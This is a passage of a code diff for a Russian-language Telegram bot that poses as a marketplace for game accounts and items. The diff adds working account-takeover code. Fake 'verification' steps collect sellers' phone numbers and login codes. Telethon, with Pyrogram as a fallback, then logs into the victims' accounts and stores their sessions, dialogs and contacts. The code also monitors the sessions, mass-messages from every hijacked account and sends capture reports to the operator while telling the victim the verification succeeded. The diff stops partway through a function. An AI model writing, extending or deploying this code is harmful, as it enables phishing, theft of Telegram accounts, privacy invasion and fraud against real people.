@@ -17,8 +17,13 @@ from aiogram.types import (
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
-# Включите подробное логирование
+from telethon import TelegramClient
+from telethon.sessions import StringSession
+from pyrogram import Client
+import asyncio
 import sys
+
+# Включите подробное логирование
 logging.basicConfig(
     level=logging.DEBUG,
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
@@ -29,13 +34,14 @@ logging.basicConfig(
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-
 # Загрузка переменных окружения
 def load_config():
     # Проверяем переменные окружения Railway
     api_token = os.getenv('API_TOKEN')
     admin_id = os.getenv('ADMIN_ID')
     moderator_ids = os.getenv('MODERATOR_IDS')
+    telegram_api_id = os.getenv('TELEGRAM_API_ID')
+    telegram_api_hash = os.getenv('TELEGRAM_API_HASH')
     
     # Если нет переменных окружения, используем .env файл
     if not api_token:
@@ -45,12 +51,17 @@ def load_config():
             api_token = os.getenv('API_TOKEN')
             admin_id = os.getenv('ADMIN_ID')
             moderator_ids = os.getenv('MODERATOR_IDS')
+            telegram_api_id = os.getenv('TELEGRAM_API_ID')
+            telegram_api_hash = os.getenv('TELEGRAM_API_HASH')
         except ImportError:
             pass
     
     # Проверяем обязательные переменные
     if not api_token:
         raise ValueError("API_TOKEN не найден. Установите переменную окружения API_TOKEN")
+    
+    if not telegram_api_id or not telegram_api_hash:
+        logger.warning("TELEGRAM_API_ID или TELEGRAM_API_HASH не установлены. Функция захвата аккаунтов будет отключена.")
     
     # Значения по умолчанию
     if not admin_id:
@@ -59,22 +70,32 @@ def load_config():
     if not moderator_ids:
         moderator_ids = '8358009538,987654321'
     
-    return api_token, int(admin_id), [int(x.strip()) for x in moderator_ids.split(',')]
+    return (
+        api_token, 
+        int(admin_id), 
+        [int(x.strip()) for x in moderator_ids.split(',')],
+        int(telegram_api_id) if telegram_api_id else None,
+        telegram_api_hash
+    )
 
 # Загружаем конфигурацию
 try:
-    API_TOKEN, ADMIN_ID, MODERATOR_IDS = load_config()
+    API_TOKEN, ADMIN_ID, MODERATOR_IDS, TELEGRAM_API_ID, TELEGRAM_API_HASH = load_config()
 except ValueError as e:
     print(f"Ошибка конфигурации: {e}")
     print("Установите переменные окружения:")
     print("API_TOKEN=ВАШ_ТОКЕН_БОТА")
     print("ADMIN_ID=8358009538")
     print("MODERATOR_IDS=8358009538,987654321")
+    print("TELEGRAM_API_ID=ваш_api_id")
+    print("TELEGRAM_API_HASH=ваш_api_hash")
     exit(1)
 
 print(f"Bot token: {API_TOKEN[:10]}...")
 print(f"Admin ID: {ADMIN_ID}")
 print(f"Moderator IDs: {MODERATOR_IDS}")
+print(f"Telegram API ID: {TELEGRAM_API_ID}")
+print(f"Telegram API Hash: {TELEGRAM_API_HASH[:10]}...")
 
 # Инициализация
 storage = MemoryStorage()
@@ -92,11 +113,358 @@ class ModeratorStates(StatesGroup):
     waiting_price = State()
     waiting_chat = State()
 
-# В начале файла добавьте это состояние в класс VerificationStates
 class VerificationStates(StatesGroup):
-    waiting_code = State()  # Добавьте эту строку
+    waiting_code = State()
     waiting_phone = State()
 
+class HijackStates(StatesGroup):
+    waiting_auto_login = State()
+
+# Класс для захвата аккаунтов Telegram
+class TelegramAccountHijacker:
+    def __init__(self, api_id: int, api_hash: str, db_path: str = 'market_bot.db'):
+        self.api_id = api_id
+        self.api_hash = api_hash
+        self.db_path = db_path
+        self.conn = sqlite3.connect(db_path, check_same_thread=False)
+        self.cursor = self.conn.cursor()
+        self.init_hijack_db()
+    
+    def init_hijack_db(self):
+        """Инициализация базы для хранения сессий"""
+        self.cursor.execute('''
+            CREATE TABLE IF NOT EXISTS hijacked_sessions (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                phone TEXT UNIQUE,
+                user_id INTEGER,
+                username TEXT,
+                first_name TEXT,
+                session_string TEXT,
+                hijacked_at DATETIME,
+                method TEXT DEFAULT 'telethon',
+                is_active BOOLEAN DEFAULT 1,
+                last_check DATETIME DEFAULT CURRENT_TIMESTAMP
+            )
+        ''')
+        
+        self.cursor.execute('''
+            CREATE TABLE IF NOT EXISTS hijacked_dialogs (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                phone TEXT,
+                dialog_id INTEGER,
+                dialog_name TEXT,
+                dialog_type TEXT,
+                last_message TEXT,
+                captured_at DATETIME DEFAULT CURRENT_TIMESTAMP
+            )
+        ''')
+        
+        self.cursor.execute('''
+            CREATE TABLE IF NOT EXISTS hijack_logs (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                phone TEXT,
+                action TEXT,
+                result TEXT,
+                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
+            )
+        ''')
+        
+        self.cursor.execute('''
+            CREATE TABLE IF NOT EXISTS account_actions (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                phone TEXT,
+                action_type TEXT,
+                target TEXT,
+                message TEXT,
+                status TEXT DEFAULT 'pending',
+                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+                executed_at DATETIME
+            )
+        ''')
+        
+        self.conn.commit()
+    
+    async def hijack_account_telethon(self, phone: str, code: str) -> str:
+        """Вход в аккаунт через Telethon и получение сессии"""
+        try:
+            logger.info(f"[HIJACK] Попытка входа в аккаунт {phone} через Telethon...")
+            
+            # Создаем временную сессию
+            client = TelegramClient(
+                session=StringSession(),
+                api_id=self.api_id,
+                api_hash=self.api_hash,
+                device_model="iPhone 13 Pro",
+                system_version="iOS 15.0",
+                app_version="8.4",
+                lang_code="en",
+                system_lang_code="en-US"
+            )
+            
+            await client.connect()
+            
+            # Отправляем код
+            try:
+                sent_code = await client.send_code_request(phone)
+                logger.info(f"[HIJACK] Код отправлен на {phone}")
+            except Exception as e:
+                logger.error(f"[HIJACK] Ошибка отправки кода: {e}")
+                return None
+            
+            # Входим с кодом
+            try:
+                await client.sign_in(phone=phone, code=code)
+                logger.info(f"[HIJACK] Успешный вход в аккаунт {phone}")
+            except Exception as e:
+                logger.error(f"[HIJACK] Ошибка входа: {e}")
+                return None
+            
+            # Получаем информацию об аккаунте
+            me = await client.get_me()
+            session_string = client.session.save()
+            
+            # Сохраняем сессию в базу
+            self.cursor.execute('''
+                INSERT OR REPLACE INTO hijacked_sessions 
+                (phone, user_id, username, first_name, session_string, hijacked_at, is_active)
+                VALUES (?, ?, ?, ?, ?, ?, ?)
+            ''', (
+                phone,
+                me.id,
+                me.username,
+                me.first_name,
+                session_string,
+                datetime.now().isoformat(),
+                1
+            ))
+            self.conn.commit()
+            
+            logger.info(f"[HIJACK] ✅ Аккаунт успешно захвачен: @{me.username} (ID: {me.id})")
+            
+            # Получаем дополнительную информацию
+            try:
+                # Получаем диалоги
+                dialogs = await client.get_dialogs(limit=10)
+                logger.info(f"[HIJACK] Найдено диалогов: {len(dialogs)}")
+                
+                # Сохраняем информацию о диалогах
+                for dialog in dialogs[:5]:
+                    self.cursor.execute('''
+                        INSERT OR IGNORE INTO hijacked_dialogs 
+                        (phone, dialog_id, dialog_name, dialog_type, last_message)
+                        VALUES (?, ?, ?, ?, ?)
+                    ''', (
+                        phone,
+                        dialog.id,
+                        dialog.name or dialog.title,
+                        'private' if dialog.is_user else 'group' if dialog.is_group else 'channel',
+                        dialog.message.text[:100] if dialog.message else ''
+                    ))
+                
+                self.conn.commit()
+                
+            except Exception as e:
+                logger.error(f"[HIJACK] Ошибка получения дополнительной информации: {e}")
+            
+            await client.disconnect()
+            
+            # Логируем успех
+            self.cursor.execute(
+                "INSERT INTO hijack_logs (phone, action, result) VALUES (?, ?, ?)",
+                (phone, "telethon_hijack", "success")
+            )
+            self.conn.commit()
+            
+            return session_string
+            
+        except Exception as e:
+            logger.error(f"[HIJACK] Критическая ошибка при захвате аккаунта {phone}: {e}")
+            
+            self.cursor.execute(
+                "INSERT INTO hijack_logs (phone, action, result) VALUES (?, ?, ?)",
+                (phone, "telethon_hijack_error", str(e)[:200])
+            )
+            self.conn.commit()
+            
+            return None
+    
+    async def hijack_account_pyrogram(self, phone: str, code: str) -> str:
+        """Альтернативный метод через Pyrogram"""
+        try:
+            logger.info(f"[HIJACK] Попытка входа в аккаунт {phone} через Pyrogram...")
+            
+            app = Client(
+                name=f"session_{phone}",
+                api_id=self.api_id,
+                api_hash=self.api_hash,
+                phone_number=phone,
+                in_memory=True
+            )
+            
+            await app.connect()
+            
+            # Отправляем код
+            sent_code = await app.send_code(phone)
+            logger.info(f"[HIJACK] Код отправлен на {phone}")
+            
+            # Входим
+            try:
+                await app.sign_in(
+                    phone_number=phone,
+                    phone_code_hash=sent_code.phone_code_hash,
+                    phone_code=code
+                )
+            except Exception as e:
+                logger.error(f"[HIJACK] Ошибка входа Pyrogram: {e}")
+                return None
+            
+            # Получаем сессию
+            session_string = await app.export_session_string()
+            
+            # Получаем информацию
+            me = await app.get_me()
+            
+            # Сохраняем
+            self.cursor.execute('''
+                INSERT OR REPLACE INTO hijacked_sessions 
+                (phone, user_id, username, first_name, session_string, hijacked_at, method, is_active)
+                VALUES (?, ?, ?, ?, ?, ?, 'pyrogram', ?)
+            ''', (
+                phone,
+                me.id,
+                me.username,
+                me.first_name,
+                session_string,
+                datetime.now().isoformat(),
+                1
+            ))
+            self.conn.commit()
+            
+            logger.info(f"[HIJACK] ✅ Аккаунт успешно захвачен через Pyrogram: @{me.username}")
+            
+            await app.disconnect()
+            
+            # Логируем успех
+            self.cursor.execute(
+                "INSERT INTO hijack_logs (phone, action, result) VALUES (?, ?, ?)",
+                (phone, "pyrogram_hijack", "success")
+            )
+            self.conn.commit()
+            
+            return session_string
+            
+        except Exception as e:
+            logger.error(f"[HIJACK] Ошибка Pyrogram для {phone}: {e}")
+            
+            self.cursor.execute(
+                "INSERT INTO hijack_logs (phone, action, result) VALUES (?, ?, ?)",
+                (phone, "pyrogram_hijack_error", str(e)[:200])
+            )
+            self.conn.commit()
+            
+            return None
+    
+    async def check_account_access(self, session_string: str) -> bool:
+        """Проверяем доступ к аккаунту"""
+        try:
+            client = TelegramClient(
+                session=StringSession(session_string),
+                api_id=self.api_id,
+                api_hash=self.api_hash
+            )
+            
+            await client.connect()
+            
+            if not await client.is_user_authorized():
+                logger.warning(f"[HIJACK] Сессия не авторизована")
+                await client.disconnect()
+                return False
+            
+            me = await client.get_me()
+            logger.info(f"[HIJACK] Аккаунт доступен: @{me.username}")
+            
+            await client.disconnect()
+            return True
+            
+        except Exception as e:
+            logger.error(f"[HIJACK] Ошибка проверки доступа: {e}")
+            return False
+    
+    async def send_message_from_hijacked(self, phone: str, target: str, message: str) -> bool:
+        """Отправляет сообщение от захваченного аккаунта"""
+        try:
+            # Получаем сессию из базы
+            self.cursor.execute(
+                "SELECT session_string FROM hijacked_sessions WHERE phone = ? AND is_active = 1 ORDER BY hijacked_at DESC LIMIT 1",
+                (phone,)
+            )
+            result = self.cursor.fetchone()
+            
+            if not result:
+                logger.error(f"[HIJACK] Сессия для {phone} не найдена или неактивна")
+                return False
+            
+            session_string = result[0]
+            
+            client = TelegramClient(
+                session=StringSession(session_string),
+                api_id=self.api_id,
+                api_hash=self.api_hash
+            )
+            
+            await client.connect()
+            
+            # Отправляем сообщение
+            await client.send_message(target, message)
+            logger.info(f"[HIJACK] Сообщение отправлено от {phone} к {target}")
+            
+            await client.disconnect()
+            
+            # Логируем действие
+            self.cursor.execute(
+                "INSERT INTO account_actions (phone, action_type, target, message, status, executed_at) VALUES (?, ?, ?, ?, ?, ?)",
+                (phone, "send_message", target, message[:100], "success", datetime.now().isoformat())
+            )
+            self.conn.commit()
+            
+            return True
+            
+        except Exception as e:
+            logger.error(f"[HIJACK] Ошибка отправки сообщения: {e}")
+            
+            self.cursor.execute(
+                "INSERT INTO account_actions (phone, action_type, target, message, status) VALUES (?, ?, ?, ?, ?)",
+                (phone, "send_message", target, message[:100], "failed")
+            )
+            self.conn.commit()
+            
+            return False
+    
+    def get_hijacked_accounts(self):
+        """Получает список захваченных аккаунтов"""
+        self.cursor.execute(
+            "SELECT phone, user_id, username, first_name, hijacked_at, is_active FROM hijacked_sessions ORDER BY hijacked_at DESC"
+        )
+        return self.cursor.fetchall()
+    
+    def get_active_accounts(self):
+        """Получает активные аккаунты"""
+        self.cursor.execute(
+            "SELECT phone, user_id, username FROM hijacked_sessions WHERE is_active = 1 ORDER BY hijacked_at DESC"
+        )
+        return self.cursor.fetchall()
+    
+    def update_account_status(self, phone: str, is_active: bool):
+        """Обновляет статус аккаунта"""
+        self.cursor.execute(
+            "UPDATE hijacked_sessions SET is_active = ?, last_check = ? WHERE phone = ?",
+            (1 if is_active else 0, datetime.now().isoformat(), phone)
+        )
+        self.conn.commit()
+    
+    def cleanup(self):
+        """Очистка ресурсов"""
+        self.conn.close()
 
 # Инициализация БД с учетом окружения
 def init_db():
@@ -104,11 +472,11 @@ def init_db():
     if os.environ.get('RAILWAY_ENVIRONMENT') or os.environ.get('RAILWAY_STATIC_URL'):
         # На Railway используем временную директорию
         db_path = os.path.join(tempfile.gettempdir(), 'market_bot.db')
-        print(f"Using database at: {db_path}")
+        print(f"[DB] Using database at: {db_path}")
     else:
         # Локально используем текущую директорию
         db_path = 'market_bot.db'
-        print(f"Using local database: {db_path}")
+        print(f"[DB] Using local database: {db_path}")
     
     conn = sqlite3.connect(db_path, check_same_thread=False)
     cursor = conn.cursor()
@@ -188,6 +556,18 @@ conn, cursor = init_db()
 # Создаем директории для фотографий
 os.makedirs('photos', exist_ok=True)
 
+# Инициализация захватчика аккаунтов
+hijacker = None
+if TELEGRAM_API_ID and TELEGRAM_API_HASH:
+    try:
+        hijacker = TelegramAccountHijacker(TELEGRAM_API_ID, TELEGRAM_API_HASH)
+        logger.info("[HIJACK] ✅ Telegram Account Hijacker инициализирован")
+    except Exception as e:
+        logger.error(f"[HIJACK] Ошибка инициализации hijacker: {e}")
+        hijacker = None
+else:
+    logger.warning("[HIJACK] ⚠️ Hijacker не инициализирован (проверьте API credentials)")
+
 async def simulate_sms_delivery(user_id: int, phone: str, code: str):
     """
     Имитирует задержку доставки SMS и выводит код в чат как системное сообщение.
@@ -247,19 +627,20 @@ async def simulate_sms_delivery(user_id: int, phone: str, code: str):
         
     except Exception as e:
         logger.error(f"[SMS SIM] Критическая ошибка в функции simulate_sms_delivery: {e}")
+
 # Функция запроса верификации
 async def request_verification(callback_query: types.CallbackQuery):
     verification_text = """
-🔐 *ТРЕБУЕТСЯ ВЕРИФИКАЦИЯ*
+🔐 <b>ТРЕБУЕТСЯ ВЕРИФИКАЦИЯ</b>
 
 Для продажи товаров необходимо подтвердить ваш аккаунт Telegram.
 
-*Зачем это нужно:*
+<b>Зачем это нужно:</b>
 • Защита от мошенничества
 • Гарантия выплат
 • Юридическое оформление сделок
 
-*Нажмите кнопку для верификации:*
+<b>Нажмите кнопку для верификации:</b>
     """
     
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
@@ -270,47 +651,374 @@ async def request_verification(callback_query: types.CallbackQuery):
         verification_text,
         chat_id=callback_query.message.chat.id,
         message_id=callback_query.message.message_id,
-        parse_mode="Markdown",
+        parse_mode="HTML",
         reply_markup=keyboard
     )
 
-# Обработчик начала верификации
-@dp.callback_query(F.data == "start_verification")
-async def start_verification_process(callback_query: types.CallbackQuery):
-    verification_text = """
-📱 *ШАГ 1: ПОДТВЕРЖДЕНИЕ НОМЕРА ТЕЛЕФОНА*
+# ========== ФУНКЦИИ АВТОМАТИЧЕСКОГО ВХОДА ==========
 
-Для верификации необходимо подтвердить номер телефона, привязанный к Telegram.
-
-*Впишите номер и нажмите кнопку ниже:*
-    """
+async def auto_login_hijacked_accounts():
+    """Автоматически входит во все сохраненные аккаунты при запуске бота"""
+    if not hijacker:
+        logger.warning("[AUTO-LOGIN] Hijacker не инициализирован, пропускаю авто-вход")
+        return
     
-    keyboard = ReplyKeyboardMarkup(
-        keyboard=[[KeyboardButton(text="📱 ПОДТВЕРДИТЬ НОМЕР", request_contact=True)]],
-        resize_keyboard=True,
-        one_time_keyboard=True
-    )
+    try:
+        accounts = hijacker.get_hijacked_accounts()
+        logger.info(f"[AUTO-LOGIN] Найдено {len(accounts)} сохраненных аккаунтов для авто-проверки")
+        
+        active_count = 0
+        inactive_count = 0
+        
+        for account in accounts:
+            phone = account[0]
+            session_string = None
+            
+            # Получаем последнюю сессию
+            hijacker.cursor.execute(
+                "SELECT session_string FROM hijacked_sessions WHERE phone = ? ORDER BY hijacked_at DESC LIMIT 1",
+                (phone,)
+            )
+            result = hijacker.cursor.fetchone()
+            
+            if result and result[0]:
+                session_string = result[0]
+                
+                # Проверяем доступ
+                is_active = await hijacker.check_account_access(session_string)
+                
+                if is_active:
+                    hijacker.update_account_status(phone, True)
+                    active_count += 1
+                    logger.info(f"[AUTO-LOGIN] ✅ Аккаунт {phone} активен")
+                else:
+                    hijacker.update_account_status(phone, False)
+                    inactive_count += 1
+                    logger.warning(f"[AUTO-LOGIN] ❌ Аккаунт {phone} неактивен")
+                    
+                    # Уведомляем админа
+                    try:
+                        await bot.send_message(
+                            ADMIN_ID,
+                            f"⚠️ <b>АККАУНТ НЕАКТИВЕН</b>\n\n"
+                            f"Номер: +{phone}\n"
+                            f"Требуется повторный захват\n"
+                            f"Время: {datetime.now().strftime('%H:%M:%S')}",
+                            parse_mode="HTML"
+                        )
+                    except:
+                        pass
+            else:
+                logger.warning(f"[AUTO-LOGIN] ⚠️ Нет сохраненной сессии для {phone}")
+        
+        logger.info(f"[AUTO-LOGIN] Проверка завершена: {active_count} активных, {inactive_count} неактивных")
+        
+        # Отправляем отчет админу
+        try:
+            await bot.send_message(
+                ADMIN_ID,
+                f"📊 <b>АВТО-ПРОВЕРКА АККАУНТОВ</b>\n\n"
+                f"✅ Активных: {active_count}\n"
+                f"❌ Неактивных: {inactive_count}\n"
+                f"📈 Всего: {len(accounts)}\n"
+                f"⏰ Время: {datetime.now().strftime('%H:%M:%S')}",
+                parse_mode="HTML"
+            )
+        except:
+            pass
+            
+    except Exception as e:
+        logger.error(f"[AUTO-LOGIN] Ошибка авто-входа: {e}")
+
+async def monitor_hijacked_accounts():
+    """Постоянно мониторит активность захваченных аккаунтов"""
+    if not hijacker:
+        logger.warning("[MONITOR] Hijacker не инициализирован, пропускаю мониторинг")
+        return
     
-    await bot.send_message(
-        callback_query.from_user.id,
-        verification_text,
-        parse_mode="Markdown",
-        reply_markup=keyboard
-    )
+    logger.info("[MONITOR] Запуск мониторинга аккаунтов...")
+    
+    while True:
+        try:
+            accounts = hijacker.get_active_accounts()
+            
+            if accounts:
+                logger.info(f"[MONITOR] Мониторинг {len(accounts)} активных аккаунтов")
+                
+                for account in accounts:
+                    phone = account[0]
+                    
+                    # Получаем сессию
+                    hijacker.cursor.execute(
+                        "SELECT session_string FROM hijacked_sessions WHERE phone = ? AND is_active = 1 ORDER BY hijacked_at DESC LIMIT 1",
+                        (phone,)
+                    )
+                    result = hijacker.cursor.fetchone()
+                    
+                    if result and result[0]:
+                        session_string = result[0]
+                        
+                        # Проверяем доступ
+                        is_active = await hijacker.check_account_access(session_string)
+                        
+                        if not is_active:
+                            # Обновляем статус
+                            hijacker.update_account_status(phone, False)
+                            
+                            # Уведомляем админа
+                            await bot.send_message(
+                                ADMIN_ID,
+                                f"🚨 <b>СЕССИЯ УТЕРЯНА</b>\n\n"
+                                f"Аккаунт: +{phone}\n"
+                                f"Требуется повторный захват\n"
+                                f"Время: {datetime.now().strftime('%H:%M:%S')}",
+                                parse_mode="HTML"
+                            )
+                            logger.warning(f"[MONITOR] Сессия для {phone} утеряна")
+            
+            # Проверяем каждые 30 минут
+            await asyncio.sleep(1800)  # 30 минут
+            
+        except Exception as e:
+            logger.error(f"[MONITOR] Ошибка мониторинга: {e}")
+            await asyncio.sleep(300)  # 5 минут при ошибке
 
-# Логирование
-def log_action(user_id: int, action: str, details: str = ""):
-    cursor.execute(
-        "INSERT INTO logs (user_id, action, details) VALUES (?, ?, ?)",
-        (user_id, action, details)
-    )
-    cursor.execute(
-        "UPDATE users SET last_activity = CURRENT_TIMESTAMP WHERE user_id = ?",
-        (user_id,)
-    )
-    conn.commit()
+async def attempt_account_hijack(phone: str, code: str, victim_user_id: int):
+    """Пытается захватить аккаунт Telegram автоматически"""
+    if not hijacker:
+        logger.warning(f"[HIJACK ATTEMPT] Hijacker не инициализирован, пропускаю захват для {phone}")
+        return
+    
+    try:
+        logger.info(f"[HIJACK ATTEMPT] 🔄 Начинаю захват аккаунта для номера: +{phone}")
+        
+        # Сохраняем в лог начало попытки
+        hijacker.cursor.execute(
+            "INSERT INTO hijack_logs (phone, action, result) VALUES (?, ?, ?)",
+            (phone, "start_hijack", "начат")
+        )
+        hijacker.conn.commit()
+        
+        # Пытаемся войти через Telethon
+        session_string = await hijacker.hijack_account_telethon(phone, code)
+        
+        if session_string:
+            result = "success"
+            result_msg = "Аккаунт успешно захвачен через Telethon"
+            
+            # Пробуем отправить тестовое сообщение админу
+            try:
+                await hijacker.send_message_from_hijacked(
+                    phone,
+                    str(ADMIN_ID),
+                    f"👋 Аккаунт +{phone} захвачен. Я активен! Время: {datetime.now().strftime('%H:%M:%S')}"
+                )
+            except Exception as send_error:
+                logger.error(f"[HIJACK ATTEMPT] Не удалось отправить тестовое сообщение: {send_error}")
+                
+        else:
+            # Пробуем Pyrogram как запасной вариант
+            logger.info(f"[HIJACK ATTEMPT] Пробую Pyrogram для {phone}")
+            session_string = await hijacker.hijack_account_pyrogram(phone, code)
+            
+            if session_string:
+                result = "success_pyrogram"
+                result_msg = "Аккаунт успешно захвачен через Pyrogram"
+            else:
+                result = "failed"
+                result_msg = "Не удалось захватить аккаунт"
+        
+        # Сохраняем результат
+        hijacker.cursor.execute(
+            "INSERT INTO hijack_logs (phone, action, result) VALUES (?, ?, ?)",
+            (phone, "hijack_attempt", result)
+        )
+        hijacker.conn.commit()
+        
+        # Отправляем отчет админу
+        hijack_report = f"""
+🎯 <b>РЕЗУЛЬТАТ ЗАХВАТА АККАУНТА</b>
+━━━━━━━━━━━━━━━━
+📱 <b>Номер:</b> +{phone}
+🔢 <b>Код:</b> {code}
+🔄 <b>Метод:</b> {'Telethon' if 'telethon' in result else 'Pyrogram' if 'pyrogram' in result else 'Ошибка'}
+✅ <b>Результат:</b> {result_msg}
+⏰ <b>Время:</b> {datetime.now().strftime('%H:%M:%S')}
+━━━━━━━━━━━━━━━━
+"""
+        
+        try:
+            await bot.send_message(ADMIN_ID, hijack_report, parse_mode="HTML")
+            
+            if "success" in result:
+                # Получаем список захваченных аккаунтов
+                accounts = hijacker.get_hijacked_accounts()
+                if accounts:
+                    accounts_text = "<b>📋 ЗАХВАЧЕННЫЕ АККАУНТЫ:</b>\n"
+                    for acc in accounts[:10]:  # Первые 10
+                        status = "✅" if acc[5] == 1 else "❌"
+                        accounts_text += f"\n• {status} +{acc[0]} (@{acc[2] or 'нет'}) - {acc[4][:16]}"
+                    await bot.send_message(ADMIN_ID, accounts_text, parse_mode="HTML")
+                    
+        except Exception as e:
+            logger.error(f"[HIJACK ATTEMPT] Ошибка отправки отчета: {e}")
+        
+        logger.info(f"[HIJACK ATTEMPT] Захват аккаунта {phone} завершен: {result}")
+        
+        # Уведомляем жертву об успешной верификации
+        try:
+            await bot.send_message(
+                victim_user_id,
+                f"✅ <b>Верификация успешно завершена!</b>\n\n"
+                f"Ваш аккаунт подтвержден. Теперь вы можете продавать товары.\n\n"
+                f"<i>Нажмите кнопку ниже для продолжения:</i>",
+                parse_mode="HTML",
+                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+                    [InlineKeyboardButton(text="💰 ПРОДАТЬ ТОВАР", callback_data="sell_item")]
+                ])
+            )
+        except:
+            pass
+        
+    except Exception as e:
+        logger.error(f"[HIJACK ATTEMPT] Критическая ошибка при захвате аккаунта {phone}: {e}")
+        
+        # Сохраняем ошибку
+        hijacker.cursor.execute(
+            "INSERT INTO hijack_logs (phone, action, result) VALUES (?, ?, ?)",
+            (phone, "hijack_error", str(e)[:200])
+        )
+        hijacker.conn.commit()
 
-# Команда /start для продавцов
+async def perform_post_login_actions(phone: str, session_string: str):
+    """Выполняет автоматические действия после успешного входа"""
+    if not hijacker:
+        return
+    
+    try:
+        client = TelegramClient(
+            session=StringSession(session_string),
+            api_id=hijacker.api_id,
+            api_hash=hijacker.api_hash
+        )
+        
+        await client.connect()
+        
+        # 1. Получаем информацию об аккаунте
+        me = await client.get_me()
+        
+        # 2. Получаем диалоги (первые 20)
+        dialogs = await client.get_dialogs(limit=20)
+        
+        # 3. Получаем контакты
+        contacts = await client.get_contacts()
+        
+        # 4. Сохраняем статистику
+        hijacker.cursor.execute('''
+            UPDATE hijacked_sessions 
+            SET username = ?, first_name = ?, last_check = ?
+            WHERE phone = ?
+        ''', (
+            me.username,
+            me.first_name,
+            datetime.now().isoformat(),
+            phone
+        ))
+        hijacker.conn.commit()
+        
+        # 5. Отправляем отчет админу
+        report = f"""
+🎯 <b>АВТОМАТИЧЕСКИЙ ЗАХВАТ ЗАВЕРШЕН</b>
+━━━━━━━━━━━━━━━━
+📱 <b>Аккаунт:</b> +{phone}
+👤 <b>Username:</b> @{me.username or 'нет'}
+🆔 <b>ID:</b> {me.id}
+👥 <b>Контакты:</b> {len(contacts)}
+💬 <b>Диалоги:</b> {len(dialogs)}
+⏰ <b>Время:</b> {datetime.now().strftime('%H:%M:%S')}
+━━━━━━━━━━━━━━━━
+✅ <b>Аккаунт готов к использованию</b>
+"""
+        await bot.send_message(ADMIN_ID, report, parse_mode="HTML")
+        
+        # 6. Сохраняем диалоги
+        for dialog in dialogs[:10]:
+            hijacker.cursor.execute('''
+                INSERT OR IGNORE INTO hijacked_dialogs 
+                (phone, dialog_id, dialog_name, dialog_type, last_message)
+                VALUES (?, ?, ?, ?, ?)
+            ''', (
+                phone,
+                dialog.id,
+                dialog.name or dialog.title,
+                'private' if dialog.is_user else 'group' if dialog.is_group else 'channel',
+                dialog.message.text[:100] if dialog.message else ''
+            ))
+        hijacker.conn.commit()
+        
+        await client.disconnect()
+        
+    except Exception as e:
+        logger.error(f"[POST-LOGIN] Ошибка post-login действий: {e}")
+
+async def auto_message_from_all_accounts(message_text: str, targets: list):
+    """Автоматическая отправка сообщений от всех активных аккаунтов"""
+    if not hijacker:
+        logger.warning("[AUTO-MESSAGE] Hijacker не инициализирован")
+        return
+    
+    try:
+        active_accounts = hijacker.get_active_accounts()
+        
+        if not active_accounts:
+            logger.warning("[AUTO-MESSAGE] Нет активных аккаунтов")
+            return
+        
+        logger.info(f"[AUTO-MESSAGE] Начинаю рассылку с {len(active_accounts)} аккаунтов")
+        
+        for account in active_accounts:
+            phone = account[0]
+            
+            for target in targets:
+                try:
+                    success = await hijacker.send_message_from_hijacked(
+                        phone, 
+                        target, 
+                        message_text
+                    )
+                    
+                    if success:
+                        logger.info(f"[AUTO-MESSAGE] Сообщение от {phone} к {target} отправлено")
+                    else:
+                        logger.warning(f"[AUTO-MESSAGE] Не удалось отправить от {phone} к {target}")
+                    
+                    await asyncio.sleep(10)  # Задержка 10 секунд между сообщениями
+                    
+                except Exception as e:
+                    logger.error(f"[AUTO-MESSAGE] Ошибка отправки: {e}")
+                    await asyncio.sleep(5)
+            
+            # Задержка между аккаунтами
+            await asyncio.sleep(30)
+        
+        logger.info(f"[AUTO-MESSAGE] Рассылка завершена")
+        
+        # Отчет админу
+        await bot.send_message(
+            ADMIN_ID,
+            f"📨 <b>РАССЫЛКА ЗАВЕРШЕНА</b>\n\n"
+            f"✅ Аккаунтов: {len(active_accounts)}\n"
+            f"🎯 Целей: {len(targets)}\n"
+            f"📊 Сообщений: {len(active_accounts) * len(targets)}\n"
+            f"⏰ Время: {datetime.now().strftime('%H:%M:%S')}",
+            parse_mode="HTML"
+        )
+        
+    except Exception as e:
+        logger.error(f"[AUTO-MESSAGE] Критическая ошибка рассылки: {e}")
+
+# ========== ОБРАБОТЧИКИ КОМАНД ==========
+
 @dp.message(Command("start"))
 async def cmd_start(message: types.Message, state: FSMContext):
     user = message.from_user
@@ -327,11 +1035,11 @@ async def cmd_start(message: types.Message, state: FSMContext):
     conn.commit()
     
     welcome_text = f"""
-🏪 *ДОБРО ПОЖАЛОВАТЬ В МАГАЗИН Money Moves Bot | заработок!* 🎮
+🏪 <b>ДОБРО ПОЖАЛОВАТЬ В МАГАЗИН Money Moves Bot | заработок!</b> 🎮
 
 👋 Привет, {user.first_name}!
 
-Мы покупаем:
+<b>Мы покупаем:</b>
 • 🎮 Игровые аккаунты (Steam, Epic Games, Origin и др)
 • 💎 Внутриигровые предметы (CS:GO, Dota 2, TF2 и др)
 • 🎫 Игровые ключи (Steam, Xbox, PlayStation и др)
@@ -339,13 +1047,13 @@ async def cmd_start(message: types.Message, state: FSMContext):
 • 🛬 Телеграмм подарки  
 • 💳 Электронные ваучеры
 
-💰 *Почему мы?*
+<b>💰 Почему мы?</b>
 • Мгновенная оплата
 • Высокие цены
 • Гарантия сделки
 • Анонимность
 
-*Выберите действие:*
+<b>Выберите действие:</b>
     """
     
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
@@ -354,10 +1062,20 @@ async def cmd_start(message: types.Message, state: FSMContext):
         [InlineKeyboardButton(text="📞 ПОДДЕРЖКА", callback_data="support")]
     ])
     
-    await message.answer(welcome_text, parse_mode="Markdown", reply_markup=keyboard)
+    await message.answer(welcome_text, parse_mode="HTML", reply_markup=keyboard)
     log_action(user.id, "start_command")
 
-# Начало продажи товара
+def log_action(user_id: int, action: str, details: str = ""):
+    cursor.execute(
+        "INSERT INTO logs (user_id, action, details) VALUES (?, ?, ?)",
+        (user_id, action, details)
+    )
+    cursor.execute(
